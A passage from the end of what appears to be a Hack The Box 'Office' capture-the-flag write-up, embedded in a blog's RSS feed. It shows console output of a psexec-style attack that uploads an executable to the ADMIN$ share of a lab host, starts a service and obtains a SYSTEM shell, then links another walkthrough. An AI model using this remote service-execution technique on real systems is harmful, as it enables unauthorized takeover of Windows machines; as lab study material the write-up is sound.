</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">*</span>] Found writable share ADMIN<span style="color:#ff79c6">$</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">*</span>] Uploading file kbuDcLOn<span style="color:#ff79c6">.</span>exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">*</span>] Opening SVCManager on <span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">11.3</span><span style="color:#ff79c6">.....</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">*</span>] Creating service NOKZ on <span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">11.3</span><span style="color:#ff79c6">.....</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">*</span>] Starting service NOKZ<span style="color:#ff79c6">.....</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">!</span>] Press help <span style="color:#ff79c6">for</span> extra shell commands
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Microsoft Windows [Version <span style="color:#bd93f9">10.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">20348.2322</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>(c) Microsoft Corporation<span style="color:#ff79c6">.</span> All rights reserved<span style="color:#ff79c6">.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:\Windows\system32<span style="color:#ff79c6">&gt;</span> whoami
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nt authority\system
</span></span></code></pre></div><h2 id="reference">Reference</h2>
<p><a href="https://namiq.net/blog/htb-office-writeup-hackthebox">For root flag I followed namiq.net&rsquo;s walkthrough.</a></p>
]]></description></item></channel></rss>